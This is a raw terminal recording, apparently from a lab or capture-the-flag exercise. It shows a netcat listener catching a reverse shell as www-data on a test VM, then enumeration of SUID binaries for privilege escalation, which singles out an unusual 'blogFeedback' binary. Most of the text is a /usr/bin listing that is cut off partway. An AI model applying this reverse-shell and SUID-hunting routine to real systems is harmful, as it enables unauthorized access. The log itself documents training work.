@@ -1,0 +1,2033 @@
+Script started on 2025-02-14 22:37:50+03:00 [COMMAND="rlwrap nc -lvnp 6047" TERM="xterm-256color" TTY="/dev/pts/2" COLUMNS="104" LINES="27"]
+[?2004hlistening on [any] 6047 ...
+[Kconnect to [172.21.1.38] from (UNKNOWN) [172.21.0.1] 5463
+bash: cannot set terminal process group (404): Inappropriate ioctl for device
+[Kbash: no job control in this shell
+www-data@bobloblaw-VirtualBox:~/html2$ [Kwww-data@bobloblaw-VirtualBox:~/html2$ [K[?2004hwww-data@bobloblaw-VirtualBox:~/html2$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls[Kls[Kls
+app.py
+__pycache__
+templates
+www-data@bobloblaw-VirtualBox:~/html2$ [Kwww-data@bobloblaw-VirtualBox:~/html2$ [K[?2004hwww-data@bobloblaw-VirtualBox:~/html2$ cd [K[K[Kfomd [K[K[K[Kind / -prem [K[K[K[Kerm -5[K4000 @>/dev/null[K[K[K[K[K[K[K[K[K[K[K[K 2>/dev/null[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hfind / -perm -4000 2>/dev/null
+[Kfind / -perm -4000 2>/dev/null[Kfind / -perm -4000 2>/dev/null[Kfind / -perm -4000 2>/dev/null
+[K/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/lib/x86_64-linux-gnu/ubuntu-app-launch/oom-adjust-setuid-helper
+/usr/lib/x86_64-linux-gnu/oxide-qt/chrome-sandbox
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/snapd/snap-confine
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/sbin/pppd
+/usr/bin/newgrp
+/usr/bin/gpasswd
+/usr/bin/traceroute6.iputils
+/usr/bin/chsh
+/usr/bin/pkexec
+/usr/bin/chfn
+/usr/bin/sudo
+/usr/bin/arping
+/usr/bin/blogFeedback
+/usr/bin/passwd
+[K/bin/ntfs-3g
+/bin/su
+/bin/fusermount
+/bin/mount
+/bin/ping
+/bin/umount
+[K/opt/VBoxGuestAdditions-6.1.12/bin/VBoxDRMClient
+www-data@bobloblaw-VirtualBox:~/html2$ [Kwww-data@bobloblaw-VirtualBox:~/html2$ [K[?2004hwww-data@bobloblaw-VirtualBox:~/html2$ ./[7m/usr/bin/blogFeedback[27m/usr/bin/blogFeedback[C[C[1Pusr/bin/blogFeedback[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004h./usr/bin/blogFeedback
+[K./usr/bin/blogFeedback[K./usr/bin/blogFeedback[K./usr/bin/blogFeedback
+bash: ./usr/bin/blogFeedback: No such file or directory
+www-data@bobloblaw-VirtualBox:~/html2$ [Kwww-data@bobloblaw-VirtualBox:~/html2$ [K[?2004hwww-data@bobloblaw-VirtualBox:~/html2$ op /usr/bin[K[K[K[K[K[K[K[K[K[K[Kcd /usr/bin[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd /usr/bin
+[Kcd /usr/bin[Kcd /usr/bin[Kcd /usr/bin
+www-data@bobloblaw-VirtualBox:/usr/bin$ [Kwww-data@bobloblaw-VirtualBox:/usr/bin$ [K[?2004hwww-data@bobloblaw-VirtualBox:/usr/bin$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls
+[
+2to3
+2to3-2.7
+2to3-3.5
+411toppm
+a11y-profile-manager-indicator
+aa-enabled
+aa-exec
+aconnect
+acpi_listen
+activity-log-manager
+add-apt-repository
+addpart
+addr2line
+alsabat
+alsaloop
+alsamixer
+alsatplg
+alsaucm
+amidi
+amixer
+amuFormat.sh
+animate
+animate-im6
+animate-im6.q16
+anytopnm
+apg
+apgbfm
+aplay
+aplaymidi
+apport-bug
+apport-cli
+apport-collect
+apport-unpack
+appres
+appstreamcli
+apropos
+apt
+apt-add-repository
+apt-cache
+apt-cdrom
+apt-config
+aptdcon
+apt-extracttemplates
+apt-ftparchive
+apt-get
+apt-key
+apt-mark
+apt-sortpkgs
+apturl
+apturl-gtk
+ar
+arch
+arecord
+arecordmidi
+arm2hpdl
+arping
+as
+asciitopgm
+aseqdump
+aseqnet
+aspell
+aspell-import
+assistant
+atktopbm
+atobm
+avahi-browse
+avahi-browse-domains
+avahi-publish
+avahi-publish-address
+avahi-publish-service
+avahi-resolve
+avahi-resolve-address
+avahi-resolve-host-name
+avahi-set-host-name
+awk
+b2sum
+baobab
+base32
+base64
+basename
+bashbug
+bc
+bccmd
+bdftopcf
+bdftruncate
+biometryd
+bioradtopgm
+bitmap
+blogFeedback
+bluemoon
+bluetoothctl
+bluetooth-sendto
+bluetooth-wizard
+bmptopnm
+bmptoppm
+bmtoa
+bootctl
+brltty-ctb
+brltty-trtxt
+brltty-ttb
+broadwayd
+browse
+brushtopbm
+bsd-from
+bsd-write
+btattach
+btmgmt
+btmon
+busctl
+c++
+c2ph
+c89
+c89-gcc
+c99
+c99-gcc
+cal
+calendar
+calibrate_ppa
+canberra-gtk-play
+cancel
+captoinfo
+catchsegv
+catman
+cautious-launcher
+cc
+cd-create-profile
+cd-fix-profile
+cd-iccdump
+cd-it8
+c++filt
+cgroups-mount
+cgroups-umount
+chacl
+chage
+chardet3
+chardetect3
+charmap
+chattr
+chcon
+check-language-support
+cheese
+chfn
+chrt
+chsh
+ciptool
+ckbcomp
+cksum
+clear
+clear_console
+cmp
+cmuwmtopbm
+codepage
+col
+colcrt
+colormgr
+colrm
+column
+combinediff
+comm
+compare
+compare-im6
+compare-im6.q16
+compiz
+compiz-decorator
+compose
+composite
+composite-im6
+composite-im6.q16
+conjure
+conjure-im6
+conjure-im6.q16
+content-hub-clipboard
+content-hub-peer-picker
+content-hub-send
+content-hub-service
+convert
+convert-im6
+convert-im6.q16
+corelist
+cpan
+cpan5.24-x86_64-linux-gnu
+cpp
+cpp-6
+crc32
+createfontdatachunk
+credentials-preferences
+c_rehash
+crontab
+csplit
+ctstat
+cups-calibrate
+cupstestdsc
+cupstestppd
+curl
+cut
+cvt
+dbus-cleanup-sockets
+dbus-daemon
+dbus-launch
+dbus-monitor
+dbus-run-session
+dbus-send
+dbus-update-activation-environment
+dbus-uuidgen
+dc
+dconf
+deallocvt
+debconf
+debconf-apt-progress
+debconf-communicate
+debconf-copydb
+debconf-escape
+debconf-set-selections
+debconf-show
+deb-systemd-helper
+deb-systemd-invoke
+dehtmldiff
+deja-dup
+deja-dup-preferences
+delpart
+designer
+desktop-file-edit
+desktop-file-install
+desktop-file-validate
+devdump
+dfu-tool
+dh_bash-completion
+dh_installxmlcatalogs
+dh_perl_openssl
+dh_pypy
+dh_python2
+dh_python3
+diff
+diff3
+diffstat
+dig
+dircolors
+dirmngr
+dirmngr-client
+dirname
+dirsplit
+display
+display-im6
+display-im6.q16
+dm-tool
+do-release-upgrade
+dpkg
+dpkg-architecture
+dpkg-buildflags
+dpkg-buildpackage
+dpkg-checkbuilddeps
+dpkg-deb
+dpkg-distaddfile
+dpkg-divert
+dpkg-genchanges
+dpkg-gencontrol
+dpkg-gensymbols
+dpkg-log-summary
+dpkg-maintscript-helper
+dpkg-mergechangelogs
+dpkg-name
+dpkg-parsechangelog
+dpkg-query
+dpkg-scanpackages
+dpkg-scansources
+dpkg-shlibdeps
+dpkg-source
+dpkg-split
+dpkg-statoverride
+dpkg-trigger
+dpkg-vendor
+dri3info
+driverless
+du
+dumpkeys
+dvipdf
+dwp
+easy_install3
+edit
+editdiff
+editor
+editres
+eject
+elfedit
+enc2xs
+encguess
+enchant
+enchant-lsmod
+enhancer
+env
+envsubst
+eog
+eps2eps
+eqn
+esc-m
+eutp
+evince
+evince-previewer
+evince-thumbnailer
+ex
+expand
+expiry
+explode
+expr
+eyuvtoppm
+factor
+faillog
+faked-sysv
+faked-tcp
+fakeroot
+fakeroot-sysv
+fakeroot-tcp
+fallocate
+fc-cache
+fc-cat
+fc-list
+fc-match
+fc-pattern
+fc-query
+fc-scan
+fc-validate
+fiascotopnm
+file
+file2brl
+file-rename
+file-roller
+filterdiff
+find
+firefox
+fitstopnm
+fixcvsdiff
+fix-qdf
+flipdiff
+flock
+fmt
+fold
+fonttosfnt
+foo2hbpl2
+foo2hbpl2-wrapper
+foo2hiperc
+foo2hiperc-wrapper
+foo2hp
+foo2hp2600-wrapper
+foo2lava
+foo2lava-wrapper
+foo2oak
+foo2oak-wrapper
+foo2qpdl
+foo2qpdl-wrapper
+foo2slx
+foo2slx-wrapper
+foo2xqx
+foo2xqx-wrapper
+foo2zjs
+foo2zjs-icc2ps
+foo2zjs-pstops
+foo2zjs-wrapper
+foomatic-rip
+free
+from
+fstopgm
+ftp
+funzip
+fwupdate
+fwupdmgr
+g++
+g3topbm
+g++-6
+gamma4scanimage
+gapplication
+gatttool
+gcalccmd
+gcc
+gcc-6
+gcc-ar
+gcc-ar-6
+gcc-nm
+gcc-nm-6
+gcc-ranlib
+gcc-ranlib-6
+gcore
+gcov
+gcov-6
+gcov-dump
+gcov-dump-6
+gcov-tool
+gcov-tool-6
+gcr-viewer
+gdb
+gdb-add-index
+gdbserver
+gdbtui
+gdbus
+gdialog
+gdk-pixbuf-thumbnailer
+gedit
+gemtopbm
+gemtopnm
+gencat
+genisoimage
+geqn
+GET
+getconf
+geteltorito
+getent
+getfacl
+getkeycodes
+getopt
+gettext
+gettextize
+gettext.sh
+ghostscript
+gifmaker
+giftopnm
+ginstall-info
+gio
+gio-querymodules
+gipddecode
+gkbd-keyboard-display
+glib-compile-resources
+glib-compile-schemas
+glxdemo
+glxgears
+glxheads
+glxinfo
+gnome-calculator
+gnome-calendar
+gnome-character-map
+gnome-disk-image-mounter
+gnome-disks
+gnome-file-share-properties
+gnome-font-viewer
+gnome-help
+gnome-keyring
+gnome-keyring-3
+gnome-keyring-daemon
+gnome-language-selector
+gnome-power-statistics
+gnome-screensaver
+gnome-screensaver-command
+gnome-screenshot
+gnome-session
+gnome-session-inhibit
+gnome-session-properties
+gnome-session-quit
+gnome-software
+gnome-system-log
+gnome-system-log-pkexec
+gnome-system-monitor
+gnome-terminal
+gnome-terminal.real
+gnome-terminal.wrapper
+gnome-text-editor
+gnome-thumbnail-font
+gnome-www-browser
+gold
+gouldtoppm
+gpasswd
+gpg
+gpg-agent
+gpgconf
+gpg-connect-agent
+gpgparsemail
+gpgsplit
+gpgv
+gpg-zip
+gpic
+gprof
+gpu-manager
+grepdiff
+gresource
+groff
+grog
+grops
+grotty
+groups
+grub-editenv
+grub-file
+grub-fstest
+grub-glue-efi
+grub-kbdcomp
+grub-menulst2cfg
+grub-mkfont
+grub-mkimage
+grub-mklayout
+grub-mknetdir
+grub-mkpasswd-pbkdf2
+grub-mkrelpath
+grub-mkrescue
+grub-mkstandalone
+grub-mount
+grub-ntldr-img
+grub-render-label
+grub-script-check
+grub-syslinux2cfg
+gs
+gsbj
+gsdj
+gsdj500
+gsettings
+gslj
+gslp
+gsnd
+gst-device-monitor-1.0
+gst-discoverer-1.0
+gst-inspect-1.0
+gst-install
+gst-launch-1.0
+gst-play-1.0
+gstreamer-codec-install
+gst-typefind-1.0
+gtbl
+gtf
+gtk-builder-tool
+gtk-launch
+gtk-query-settings
+gtk-update-icon-cache
+gtk-window-decorator
+gucharmap
+gvfs-cat
+gvfs-copy
+gvfs-info
+gvfs-less
+gvfs-ls
+gvfs-mime
+gvfs-mkdir
+gvfs-monitor-dir
+gvfs-monitor-file
+gvfs-mount
+gvfs-move
+gvfs-open
+gvfs-rename
+gvfs-rm
+gvfs-save
+gvfs-set-attribute
+gvfs-trash
+gvfs-tree
+h2ph
+h2xs
+hbpldecode
+hciattach
+hcitool
+hd
+head
+HEAD
+helpztags
+hex2hcd
+hexdump
+hipercdecode
+hipstopgm
+history-daemon
+host
+hostid
+hostnamectl
+hp-align
+hp-check
+hp-clean
+hp-colorcal
+hp-config_usb_printer
+hp-doctor
+hp-firmware
+hp-info
+hp-levels
+hp-logcapture
+hp-makeuri
+hp-pkservice
+hp-plugin
+hp-plugin-ubuntu
+hp-probe
+hp-query
+hp-scan
+hp-setup
+hp-testpage
+hp-timedate
+hwe-support-status
+i386
+i686-linux-gnu-pkg-config
+ibus
+ibus-daemon
+ibus-setup
+ibus-table-createdb
+iceauth
+ico
+icontopbm
+iconv
+id
+identify
+identify-im6
+identify-im6.q16
+iecset
+igt_stats
+ijs_pxljr
+ilbmtoppm
+imagetops
+im-config
+imgtoppm
+im-launch
+import
+import-im6
+import-im6.q16
+info
+infobrowser
+infocmp
+infotocap
+init-checkconf
+initctl2dot
+inputattach
+install
+install-info
+install-printerdriver
+instmodsh
+intel_aubdump
+intel_audio_dump
+intel_backlight
+intel_bios_dumper
+intel_bios_reader
+intel_display_crc
+intel_display_poller
+intel_dump_decode
+intel_error_decode
+intel_firmware_decode
+intel_forcewaked
+intel_framebuffer_dump
+intel_gem_info
+intel-gen4asm
+intel-gen4disasm
+intel_gpu_abrt
+intel_gpu_frequency
+intel-gpu-overlay
+intel_gpu_time
+intel_gpu_top
+intel_gtt
+intel_guc_logger
+intel_infoframes
+intel_l3_parity
+intel_lid
+intel_opregion_decode
+intel_panel_fitter
+intel_perf_counters
+intel_reg
+intel_reg_checker
+intel_residency
+intel_stepping
+intel-virtual-output
+intel_watermark
+interdiff
+ionice
+ipcmk
+ipcrm
+ipcs
+ipod-read-sysinfo-extended
+ipod-time-sync
+ippfind
+ipptool
+iptables-xml
+ischroot
+isdv4-serial-debugger
+isdv4-serial-inputattach
+isodump
+isoinfo
+isovfy
+ispell-wrapper
+join
+jpegtopnm
+jpgicc
+json_pp
+[Kjwt3
+kbdinfo
+kbxutil
+kernel-install
+kerneloops-submit
+killall
+kmodsign
+knock
+koi8rxterm
+l2ping
+l2test
+last
+lastb
+lastlog
+lavadecode
+lcf
+lconvert
+ld
+ld.bfd
+ldd
+ld.gold
+leaftoppm
+less
+lessecho
+lessfile
+lesskey
+lesspipe
+lexgrog
+libertined
+libertine-launch
+libertine-xmir
+libnetcfg
+libreoffice
+libwacom-list-local-devices
+lightdm-unity8-session
+line
+linguist
+link
+linkicc
+lintian
+lintian-info
+lintian-lab-tool
+linux32
+linux64
+linux-boot-prober
+linux-check-removal
+linux-update-symlinks
+linux-version
+lispmtopgm
+listres
+lnstat
+loadkeys
+loadunimap
+localc
+locale
+localectl
+localedef
+locate
+lodraw
+loffice
+lofromtemplate
+logger
+logname
+loimpress
+lomath
+look
+lorder
+loweb
+lowriter
+lp
+lpoptions
+lpq
+lpr
+lprm
+lpstat
+lrelease
+lsattr
+lsb_release
+lscpu
+lsdiff
+lshw
+lsinitramfs
+lsipc
+lslocks
+lslogins
+lsns
+lsof
+lspci
+lspgpot
+lsusb
+ltrace
+luit
+lupdate
+lwp-download
+lwp-dump
+lwp-mirror
+lwp-request
+lxterm
+lz
+lzcat
+lzcmp
+lzdiff
+lzegrep
+lzfgrep
+lzgrep
+lzless
+lzma
+lzmainfo
+lzmore
+macptopbm
+make
+make-first-existing-target
+man
+mandb
+manpath
+mapscrn
+mattrib
+mawk
+mbadblocks
+mcat
+mcd
+mcheck
+mclasserase
+mcomp
+mcookie
+mcopy
+mc-tool
+mc-wait-for-name
+md5sum
+md5sum.textutils
+mdatopbm
+mdel
+mdeltree
+mdir
+mdu
+mediascanner-service-2.0
+mesg
+mformat
+mgrtopbm
+migrate-pubring-from-classic-gpg
+mimeopen
+mimetype
+min12xxw
+minfo
+mkfifo
+mkfontdir
+mkfontscale
+mkisofs
+mkmanifest
+mk_modmap
+mksquashfs
+mkzftree
+mlabel
+mlocate
+mmcli
+mmd
+mmount
+mmove
+moc
+mogrify
+mogrify-im6
+mogrify-im6.q16
+monitor-sensor
+montage
+montage-im6
+montage-im6.q16
+mousetweaks
+mpartition
+mrd
+mren
+mscompress
+msexpand
+msgattrib
+msgcat
+msgcmp
+msgcomm
+msgconv
+msgen
+msgexec
+msgfilter
+msgfmt
+msggrep
+msginit
+msgmerge
+msgunfmt
+msguniq
+mshortname
+mshowfat
+mtools
+mtoolstest
+mtr
+mtrace
+mtvtoppm
+mtype
+mxtar
+mzip
+namei
+nautilus
+nautilus-autorun-software
+nautilus-sendto
+nawk
+ncal
+neotoppm
+neqn
+netkit-ftp
+newgrp
+ngettext
+nice
+nl
+nm
+nm-applet
+nmcli
+nm-connection-editor
+nm-online
+nmtui
+nmtui-connect
+nmtui-edit
+nmtui-hostname
+nohup
+notify-send
+nproc
+nroff
+nsenter
+nslookup
+nstat
+nsupdate
+ntfsdecrypt
+numfmt
+nvidia-detector
+oakdecode
+obexctl
+objcopy
+objdump
+oclock
+od
+ofono-setup
+on_ac_power
+onboard
+onboard-settings
+online-accounts-hooks
+online-accounts-hooks2
+online-accounts-preferences
+online-accounts-service
+online-accounts-ui
+openssl
+opldecode
+orca
+orca-dm-wrapper
+os-prober
+p11-kit
+pacat
+pacmd
+pactl
+padsp
+pager
+painter
+palmtopnm
+pamcut
+pamdeinterlace
+pamdice
+pamfile
+pamoil
+pamon
+pamstack
+pamstretch
+pamstretch-gen
+paperconf
+paplay
+parec
+parecord
+parsechangelog
+partx
+passwd
+paste
+pasted
+pasuspender
+patch
+pathchk
+pax11publish
+pbmclean
+pbmlife
+pbmmake
+pbmmask
+pbmpage
+pbmpscale
+pbmreduce
+pbmtext
+pbmtextps
+pbmto10x
+pbmtoascii
+pbmtoatk
+pbmtobbnbg
+pbmtocmuwm
+pbmtoepsi
+pbmtoepson
+pbmtog3
+pbmtogem
+pbmtogo
+pbmtoicon
+pbmtolj
+pbmtomacp
+pbmtomda
+pbmtomgr
+pbmtonokia
+pbmtopgm
+pbmtopi3
+pbmtoplot
+pbmtoppa
+pbmtopsg3
+pbmtoptx
+pbmtowbmp
+pbmtox10bm
+pbmtoxbm
+pbmtoybm
+pbmtozinc
+pbmupc
+pcimodules
+pcxtoppm
+pdb
+pdb2.7
+pdb3
+pdb3.5
+pdf2dsc
+pdf2ps
+pdfdetach
+pdffonts
+pdfimages
+pdfinfo
+pdfseparate
+pdfsig
+pdftocairo
+pdftohtml
+pdftoppm
+pdftops
+pdftotext
+pdfunite
+peekfd
+perl
+perl5.24.1
+perl5.24-x86_64-linux-gnu
+perlbug
+perldoc
+perlivp
+perlthanks
+pf2afm
+pfbtopfa
+pftp
+pg
+pgmbentley
+pgmcrater
+pgmedge
+pgmenhance
+pgmhist
+pgmkernel
+pgmnoise
+pgmnorm
+pgmoil
+pgmramp
+pgmslice
+pgmtexture
+pgmtofs
+pgmtolispm
+pgmtopbm
+pgmtoppm
+pgrep
+phone-gsettings-migration.py
+pi1toppm
+pi3topbm
+pic
+pico
+piconv
+pilconvert
+pildriver
+pilfile
+pilfont
+pilprint
+pinentry
+pinentry-curses
+pinentry-gnome3
+pinentry-x11
+pinky
+pip3
+pixeltool
+pjtoppm
+pkaction
+pkcheck
+pkcon
+pkexec
+pkg-config
+pkill
+pkmon
+pkttyagent
+pl2pm
+plainbox-qml-shell
+plainbox-trusted-launcher-1
+player
+pldd
+plog
+pmap
+pngtopnm
+pnm2ppa
+pnmalias
+pnmarith
+pnmcat
+pnmcolormap
+pnmcomp
+pnmconvol
+pnmcrop
+pnmcut
+pnmdepth
+pnmenlarge
+pnmfile
+pnmflip
+pnmgamma
+pnmhisteq
+pnmhistmap
+pnmindex
+pnminterp
+pnminterp-gen
+pnminvert
+pnmmargin
+pnmmontage
+pnmnlfilt
+pnmnoraw
+pnmnorm
+pnmpad
+pnmpaste
+pnmpsnr
+pnmquant
+pnmremap
+pnmrotate
+pnmscale
+pnmscalefixed
+pnmshear
+pnmsmooth
+pnmsplit
+pnmtile
+pnmtoddif
+pnmtofiasco
+pnmtofits
+pnmtojpeg
+pnmtopalm
+pnmtoplainpnm
+pnmtopng
+pnmtops
+pnmtorast
+pnmtorle
+pnmtosgi
+pnmtosir
+pnmtotiff
+pnmtotiffcmyk
+pnmtoxwd
+pod2html
+pod2man
+pod2text
+pod2usage
+podchecker
+podselect
+poff
+pon
+POST
+ppdc
+ppdhtml
+ppdi
+ppdmerge
+ppdpo
+pphs
+ppm3d
+ppmbrighten
+ppmchange
+ppmcie
+ppmcolormask
+ppmcolors
+ppmdim
+ppmdist
+ppmdither
+ppmfade
+ppmflash
+ppmforge
+ppmhist
+ppmlabel
+ppmmake
+ppmmix
+ppmnorm
+ppmntsc
+ppmpat
+ppmquant
+ppmquantall
+ppmqvga
+ppmrainbow
+ppmrelief
+ppmshadow
+ppmshift
+ppmspread
+ppmtoacad
+ppmtobmp
+ppmtoeyuv
+ppmtogif
+ppmtoicr
+ppmtoilbm
+ppmtojpeg
+ppmtoleaf
+ppmtolj
+ppmtomap
+ppmtomitsu
+ppmtompeg
+ppmtoneo
+ppmtopcx
+ppmtopgm
+ppmtopi1
+ppmtopict
+ppmtopj
+ppmtopuzz
+ppmtorgb3
+ppmtosixel
+ppmtotga
+ppmtouil
+ppmtowinicon
+ppmtoxpm
+ppmtoyuv
+ppmtoyuvsplit
+ppmtv
+pr
+precat
+preconv
+prename
+preunzip
+prezip
+prezip-bin
+print
+printafm
+printenv
+printerbanner
+printer-profile
+printf
+prlimit
+prove
+prtstat
+ps2ascii
+ps2epsi
+ps2pdf
+ps2pdf12
+ps2pdf13
+ps2pdf14
+ps2pdfwr
+ps2ps
+ps2ps2
+ps2txt
+psfaddtable
+psfgettable
+psfstriptable
+psfxtable
+psicc
+psidtopgm
+pstopnm
+pstree
+pstree.x11
+pstruct
+ptar
+ptardiff
+ptargrep
+ptx
+pulseaudio
+pwdx
+py3clean
+py3compile
+py3versions
+pybuild
+pyclean
+pycompile
+pydoc
+pydoc2.7
+pydoc3
+pydoc3.5
+pygettext
+pygettext2.7
+pygettext3
+pygettext3.5
+python
+python2
+python2.7
+python3
+python3.5
+python3.5m
+python3m
+pyversions
+qcollectiongenerator
+qdbus
+qdbuscpp2xml
+qdbusviewer
+qdbusxml2cpp
+qdoc
+qdoc3
+qhelpconverter
+qhelpgenerator
+qlalr
+qmake
+qml
+qml1plugindump
+qmlbundle
+qmleasing
+qmlimportscanner
+qmllint
+qmlmin
+qmlplugindump
+qmlprofiler
+qmlscene
+qmltestrunner
+qmlviewer
+qpdf
+qpdldecode
+qrttoppm
+qtchooser
+qtconfig
+qtdiag
+qtpaths
+qtplugininfo
+quirks-handler
+ranlib
+rasttopnm
+rawtopgm
+rawtoppm
+rcc
+rcp
+rctest
+readelf
+realpath
+recode-sr-latin
+recountdiff
+rediff
+remmina
+rename
+rename.ul
+rendercheck
+renice
+reset
+resize
+resizecons
+resizepart
+rev
+rfcomm
+rgb3toppm
+rgrep
+rhythmbox
+rhythmbox-client
+rletopnm
+rlogin
+routef
+routel
+rpcgen
+rsh
+rstart
+rstartd
+rsync
+rtstat
+runcon
+run-mailcap
+run-with-aspell
+rview
+sane-find-scanner
+savelog
+sbattach
+sbigtopgm
+sbkeysync
+sbsiglist
+sbsign
+sbvarsign
+sbverify
+scanimage
+scp
+scp-dbus-service
+screendump
+script
+scriptreplay
+sdiff
+sdptool
+seahorse
+see
+select-default-iwrap
+select-editor
+sensible-browser
+sensible-editor
+sensible-pager
+seq
+session-installer
+session-migration
+sessreg
+setarch
+setfacl
+setkeycodes
+setleds
+setlogcons
+setmetamode
+setpci
+setsid
+setterm
+setxkbmap
+sftp
+sg
+sgitopnm
+sha1sum
+sha224sum
+sha256sum
+sha384sum
+sha512sum
+shasum
+shotwell
+showconsolefont
+showkey
+showrgb
+shred
+shuf
+signond
+signonpluginprocess
+signon-ui
+simple-scan
+sirtopnm
+size
+skill
+slabtop
+sldtoppm
+slogin
+slxdecode
+smproxy
+snap
+snapctl
+snappy-xmir
+snappy-xmir-envvars
+snice
+soelim
+soffice
+software-properties-gtk
+sort
+sotruss
+spctoppm
+spd-conf
+spd-say
+speaker-test
+speech-dispatcher
+spellintian
+splain
+split
+splitdiff
+splitfont
+sprof
+sputoppm
+sqldiff
+sqlite3
+ssh
+ssh-add
+ssh-agent
+ssh-argv0
+ssh-copy-id
+ssh-keygen
+ssh-keyscan
+st4topgm
+start-pulseaudio-x11
+startx
+stat
+stdbuf
+strace
+stream
+stream-im6
+stream-im6.q16
+strings
+strip
+sudo
+sudoedit
+sudoreplay
+sum
+symcryptrun
+synclient
+syndaemon
+syslinux
+syslinux-legacy
+system-config-printer
+system-config-printer-applet
+systemd-analyze
+systemd-cat
+systemd-cgls
+systemd-cgtop
+systemd-delta
+systemd-detect-virt
+systemd-mount
+systemd-path
+systemd-resolve
+systemd-run
+systemd-socket-activate
+systemd-stdio-bridge
+system-settings
+t1ascii
+t1asm
+t1binary
+t1disasm
+t1mac
+t1unmac
+tabs
+tac
+tail
+taskset
+tbl
+tclsh
+tclsh8.6
+tee
+telephony-service-approver
+telephony-service-handler
+telephony-service-indicator
+telnet
+telnet.netkit
+terminal
+test
+tgatoppm
+tgz
+thinkjettopbm
+thresholder
+thumbnailer-admin
+thunderbird
+tic
+tifftopnm
+tificc
+time
+timedatectl
+timeout
+tload
+toe
+tonegend
+top
+totem
+totem-audio-preview
+totem-video-thumbnailer
+touch
+tput
+tr
+tracepath
+traceroute6
+traceroute6.iputils
+transicc
+transmission-gtk
+transset
+troff
+truncate
+trust
+tset
+tsort
+ttfread
+tty
+tzselect
+ubuntu-bug
+ubuntu-core-launcher
+ubuntu-download-manager
+ubuntu-drivers
+ubuntu-printing-app
+ubuntu-queue-dialog
+ubuntu-software
+ubuntu-support-status
+ubuntu-webapps-update-index
+ucf
+ucfq
+ucfr
+ucs2any
+udisksctl
+uic
+uic3
+ul
+umax_pp
+unattended-upgrade
+unattended-upgrades
+unexpand
+unicode_stop
+uniq
+unity
+unity8
+unity8-dash
+unity-control-center
+unity-scope-loader
+unity-settings-daemon
+unity-system-compositor-spinner
+unity-webapps-desktop-file
+unity-webapps-qml-launcher
+unity-webapps-runner
+unlink
+unlzma
+unopkg
+unshare
+unsquashfs
+unwrapdiff
+unxz
+unzip
+unzipsfx
+update-alternatives
+updatedb
+updatedb.mlocate
+update-desktop-database
+update-manager
+update-mime-database
+update-mime-database.real
+update-notifier
+upower
+uptime
+url-dispatcher
+url-dispatcher-dump
+usb-creator-gtk
+usb-devices
+usbhid-dump
+usb_printerid
+users
+utmpdump
+uuidgen
+uxterm
+uz
+VBoxClient
+VBoxClient-all
+VBoxControl
+VBoxDRMClient
+vi
+view
+viewer
+viewres
+vim.tiny
+vino-passwd
+vino-preferences
+vmstat
+vmwarectrl
+volname
+vstp
+w
+wall
+watch
+watchgnupg
+wbmptopbm
+wc
+webapp-container
+webapp-container-hook
+webbrowser-app
+wget
+whatis
+whereis
+which
+who
+whoami
+whoopsie
+whoopsie-preferences
+winicontoppm
+wish
+wish8.6
+word-list-compress
+wpa_passphrase
+w.procps
+write
+X
+X11
+x11perf
+x11perfcomp
+x86_64
+x86_64-linux-gnu-addr2line
+x86_64-linux-gnu-ar
+x86_64-linux-gnu-as
+x86_64-linux-gnu-c++filt
+x86_64-linux-gnu-cpp
+x86_64-linux-gnu-cpp-6
+x86_64-linux-gnu-dwp
+x86_64-linux-gnu-elfedit
+x86_64-linux-gnu-g++
+x86_64-linux-gnu-g++-6
+x86_64-linux-gnu-gcc
+x86_64-linux-gnu-gcc-6
+x86_64-linux-gnu-gcc-ar
+x86_64-linux-gnu-gcc-ar-6
+x86_64-linux-gnu-gcc-nm
+x86_64-linux-gnu-gcc-nm-6
+x86_64-linux-gnu-gcc-ranlib
+x86_64-linux-gnu-gcc-ranlib-6
+x86_64-linux-gnu-gcov
+x86_64-linux-gnu-gcov-6
+x86_64-linux-gnu-gcov-dump
+x86_64-linux-gnu-gcov-dump-6
+x86_64-linux-gnu-gcov-tool
+x86_64-linux-gnu-gcov-tool-6
+x86_64-linux-gnu-gprof
+x86_64-linux-gnu-ld
+x86_64-linux-gnu-ld.bfd
+x86_64-linux-gnu-ld.gold
+x86_64-linux-gnu-nm
+x86_64-linux-gnu-objcopy
+x86_64-linux-gnu-objdump
+x86_64-linux-gnu-pkg-config
+x86_64-linux-gnu-ranlib
+x86_64-linux-gnu-readelf
+x86_64-linux-gnu-size
+x86_64-linux-gnu-strings
+x86_64-linux-gnu-strip
+x86_64-pc-linux-gnu-pkg-config
+xargs
+xauth
+xbiff
+xbmtopbm
+xbrlapi
+xcalc
+xclipboard
+xclock
+xcmsdb
+xconsole
+xcursorgen
+xcutsel
+xdg-desktop-icon
+xdg-desktop-menu
+xdg-email
+xdg-icon-resource
+xdg-mime
+xdg-open
+xdg-screensaver
+xdg-settings
+xdg-user-dir
+xdg-user-dirs-gtk-update
+xdg-user-dirs-update
+xdiagnose
+xdiagnose-pkexec
+xditview
+xdpyinfo
+xdriinfo
+xedid
+xedit
+xev
+xeyes
+xfd
+xfontsel
+xgamma
+xgc
+xgettext
+xhost
+ximtoppm
+xinit
+xinput
+xkbbell
+xkbcomp
+xkbevd
+xkbprint
+xkbvleds
+xkbwatch
+xkeystone
+xkill
+xload
+xlogo
+xlsatoms
+xlsclients
+xlsfonts
+xmag
+xman
+xmessage
+Xmir
+xmlpatterns
+xmlpatternsvalidator
+xmodmap
+xmore
+Xorg
+xpci
+xpmtoppm
+xprop
+xqxdecode
+xrandr
+xrandr-tool
+xrdb
